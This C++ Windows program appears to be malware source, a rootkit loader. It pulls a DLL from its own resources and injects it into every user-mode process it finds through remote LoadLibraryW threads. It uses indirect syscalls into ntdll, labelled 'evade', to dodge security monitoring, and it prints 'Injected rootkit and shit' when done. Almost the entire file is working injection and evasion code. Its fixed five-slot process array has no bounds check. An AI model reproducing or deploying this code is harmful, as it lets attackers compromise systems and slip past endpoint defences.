#include "includes.h"
#define IDR_DLL1 101
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
extern "C" UINT_PTR NtOpenProcessSyscall = NULL;
extern "C" UINT_PTR NtFreeVirtualMemorySyscall = NULL;
extern "C" UINT_PTR NtCreateThreadExSyscall = NULL;
extern "C" UINT_PTR NtCloseSyscall = NULL;
extern "C" UINT_PTR NtProtectVirtualMemorySyscall = NULL;
extern "C" UINT_PTR NtAllocateVirtualMemorySyscall = NULL;
extern "C" UINT_PTR NtWriteVirtualMemorySyscall = NULL;
extern "C" UINT_PTR NtOpenProcessTokenSyscall = NULL;

#include <filesystem>
#include <fstream>

static bool IsGoodUserModeProcess(DWORD processID) {
	// Open the process to get its token and check its user
	HANDLE hProcess = NULL;
	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL }; /* Basically the properties of the thread created. (automatic) */
	CLIENT_ID CID = { (HANDLE)processID, NULL };
	//HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processID);
	evadeNtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION, &OA, &CID);
	if (hProcess == NULL) {
		return false;
	}
	HANDLE hToken;
	if (!evadeNtOpenProcessToken(hProcess, TOKEN_QUERY, &hToken)){
		evadeNtClose(hProcess);
		return false;
	}

	TOKEN_ELEVATION_TYPE tokenType;
	DWORD dwSize;
	if (!GetTokenInformation(hToken, TokenElevationType, &tokenType, sizeof(tokenType), &dwSize)) {
		evadeNtClose(hToken);
		evadeNtClose(hProcess);
		return false;
	}

	evadeNtClose(hToken);
	evadeNtClose(hProcess);

	// Check if it's not running as SYSTEM (TokenElevationType should be TokenElevationTypeLimited or TokenElevationTypeFull for user-mode)
	return tokenType != TokenElevationTypeDefault;
}

static void FindUserModeProcesses(DWORD goodProcesses[], int& processCount) {
	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snap == INVALID_HANDLE_VALUE) {
		std::cerr << "Failed to create snapshot." << std::endl;
		return;
	}

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(snap, &entry)) {
		do {
			// Skip system processes that aren't user-mode (such as SYSTEM or other low-level processes)
			if (IsGoodUserModeProcess(entry.th32ProcessID)) {
				// Add the PID to the array
				goodProcesses[processCount] = entry.th32ProcessID;
				processCount++;  // Increment process count
			}
		} while (Process32Next(snap, &entry));
	}
	evadeNtClose(snap);
}

static std::wstring WriteDLLToTempFile(const void* dllData, size_t dllSize) {
    wchar_t tempPath[MAX_PATH];
    wchar_t tempFileName[MAX_PATH];
    
    if (!GetTempPathW(MAX_PATH, tempPath)) {
        throw std::runtime_error("Failed to get temp path");
    }
    
    if (!GetTempFileNameW(tempPath, L"dll", 0, tempFileName)) {
        throw std::runtime_error("Failed to create temp file");
    }

    std::ofstream file(tempFileName, std::ios::binary);
    if (!file) {
        throw std::runtime_error("Failed to open temp file for writing");
    }

    file.write(static_cast<const char*>(dllData), dllSize);
    file.close();

    return std::wstring(tempFileName);
}

static int InjectDLL(DWORD PID, const void* dllData, size_t dllSize) {
    // Validate input parameters
    if (!dllData || dllSize == 0) {
        printf("Invalid DLL data or size\n");
        return 1;
    }

    // Write DLL to temp file
    std::wstring dllPath;
    try {
        dllPath = WriteDLLToTempFile(dllData, dllSize);
    }
    catch (const std::exception& e) {
        printf("Failed to write DLL to temp file: %s\n", e.what());
        return 1;
    }

    NTSTATUS status;
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
    CLIENT_ID CID = { (HANDLE)PID, NULL };
    ACCESS_MASK accessMask = PROCESS_ALL_ACCESS;
    
    status = evadeNtOpenProcess(&hProcess, accessMask, &OA, &CID);
    if (status != STATUS_SUCCESS) {
        DeleteFileW(dllPath.c_str());
        printf("Failed to open process\n");
        return 1;
    }

    // Allocate memory for DLL path
    size_t pathSize = (dllPath.length() + 1) * sizeof(wchar_t);
    PVOID baseAddr = NULL;
    DWORD_PTR zerobits = 0;
    status = evadeNtAllocateVirtualMemory(hProcess, &baseAddr, zerobits, &pathSize, MEM_COMMIT, PAGE_READWRITE);
    if (status != STATUS_SUCCESS) {
        DeleteFileW(dllPath.c_str());
        evadeNtClose(hProcess);
        return 1;
    }

    // Write DLL path to process memory
    SIZE_T bytesWritten;
    status = evadeNtWriteVirtualMemory(hProcess, baseAddr, (PVOID)dllPath.c_str(), pathSize, &bytesWritten);
    if (status != STATUS_SUCCESS) {
        DeleteFileW(dllPath.c_str());
        evadeNtClose(hProcess);
        return 1;
    }

    // Get LoadLibraryW address
    HMODULE Kernel32 = GetModuleHandleW(L"Kernel32");
    if (!Kernel32) {
        DeleteFileW(dllPath.c_str());
        evadeNtClose(hProcess);
        return 1;
    }

    LPTHREAD_START_ROUTINE loadLibraryAddr = (LPTHREAD_START_ROUTINE)GetProcAddress(Kernel32, "LoadLibraryW");
    if (!loadLibraryAddr) {
        DeleteFileW(dllPath.c_str());
        evadeNtClose(hProcess);
        return 1;
    }

    // Create remote thread to load DLL
    HANDLE hThread;
    status = evadeNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                                 loadLibraryAddr, baseAddr,
                                 FALSE, 0, 0, 0, NULL);

    if (!hThread || status != STATUS_SUCCESS) {
        DeleteFileW(dllPath.c_str());
        evadeNtClose(hProcess);
        return 1;
    }

    // Wait for thread completion
    WaitForSingleObject(hThread, INFINITE);

    // Get thread exit code to verify DLL loading
    DWORD exitCode = 0;
    if (GetExitCodeThread(hThread, &exitCode) && exitCode == 0) {
        printf("DLL failed to load in remote process\n");
        DeleteFileW(dllPath.c_str());
        evadeNtClose(hThread);
        evadeNtClose(hProcess);
        return 1;
    }

    printf("Successfully injected DLL into process %d\n", PID);
    
    // Cleanup
    DeleteFileW(dllPath.c_str());
    evadeNtClose(hThread);
    evadeNtClose(hProcess);
    
    return 0;
}

static void* LoadDllFromResource(HMODULE hModule, DWORD& dllSize) {
	// Find the DLL resource in the EXE
	HRSRC hResource = FindResource(hModule, MAKEINTRESOURCE(IDR_DLL1), RT_RCDATA);
	if (!hResource) {
		std::cerr << "Failed to find DLL resource." << std::endl;
		return NULL;
	}

	// Load the DLL resource into memory
	HGLOBAL hLoadedResource = LoadResource(hModule, hResource);
	if (!hLoadedResource) {
		std::cerr << "Failed to load DLL resource." << std::endl;
		return NULL;
	}

	// Lock the resource to get a pointer to the DLL data
	void* dllData = LockResource(hLoadedResource);
	dllSize = SizeofResource(hModule, hResource);
	return dllData;
}

int main() {
	HMODULE ntdll = GetModuleHandleW(L"ntdll");
	if (!ntdll) {
		std::cout << "Could not load ntdll...\n";
		return 1;
	}
	/* Begin decleration of indirect syscall functions. */
	UINT_PTR pNtOpenProcessAddress = NULL;
	pNtOpenProcessAddress = (UINT_PTR)GetProcAddress(ntdll, "NtOpenProcess");
	NtOpenProcessSyscall = pNtOpenProcessAddress + 0x12;
	UINT_PTR pNtFreeVirtualMemory = NULL;
	pNtFreeVirtualMemory = (UINT_PTR)GetProcAddress(ntdll, "NtFreeVirtualMemory");
	NtFreeVirtualMemorySyscall = pNtFreeVirtualMemory + 0x12;
	UINT_PTR pNtCreateThreadEx = NULL;
	pNtCreateThreadEx = (UINT_PTR)GetProcAddress(ntdll, "NtCreateThreadEx");
	NtCreateThreadExSyscall = pNtCreateThreadEx + 0x12;
	UINT_PTR pNtClose = NULL;
	pNtClose = (UINT_PTR)GetProcAddress(ntdll, "NtClose");
	NtCloseSyscall = pNtClose + 0x12;
	UINT_PTR pNtProtectVirtualMemory = NULL;
	pNtProtectVirtualMemory = (UINT_PTR)GetProcAddress(ntdll, "NtProtectVirtualMemory");
	NtProtectVirtualMemorySyscall = pNtProtectVirtualMemory + 0x12;
	UINT_PTR pNtAllocateVirtualMemory = NULL;
	pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
	NtAllocateVirtualMemorySyscall = pNtAllocateVirtualMemory + 0x12;
	UINT_PTR pNtWriteVirtualMemory = NULL;
	pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(ntdll, "NtWriteVirtualMemory");
	NtWriteVirtualMemorySyscall = pNtWriteVirtualMemory + 0x12;
	UINT_PTR pNtOpenProcessToken = NULL;
	pNtOpenProcessToken = (UINT_PTR)GetProcAddress(ntdll, "NtOpenProcessToken");
	NtOpenProcessTokenSyscall = pNtOpenProcessToken + 0x12;
	/* END */
	/* ------------------------- */
	const int MAXPROCESSES = 5;
	DWORD goodProcesses[MAXPROCESSES];
	int processesCount = 0;
	// INJECT!
	HMODULE hModule = GetModuleHandle(NULL);
	DWORD dllSize = 0;
	void* dllData = LoadDllFromResource(hModule, dllSize);
	if (!dllData) {
		std::cerr << "Failed to load DLL from resources." << std::endl;
		return 1;
	}
	// First uncomment the function call
	FindUserModeProcesses(goodProcesses, processesCount);

	// Then modify the loop to use actual process count
	for (int i = 0; i < processesCount; i++) {
		if (goodProcesses[i] != 0) { // Add check for valid PID
			int result = InjectDLL(goodProcesses[i], dllData, dllSize);
			if (result == 1) {
				std::cerr << "Injection failed for process ID: " << goodProcesses[i] << std::endl;
				continue; // Continue with next process instead of returning
			}
			std::cout << "Successfully injected into process ID: " << goodProcesses[i] << std::endl;
		}
	}
	printf("Injected rootkit and shit\n");
	std::cout << "DLL Data: " << dllData << std::endl;
	std::cout << "DLL Size: " << dllSize << std::endl;
	return 0;
}
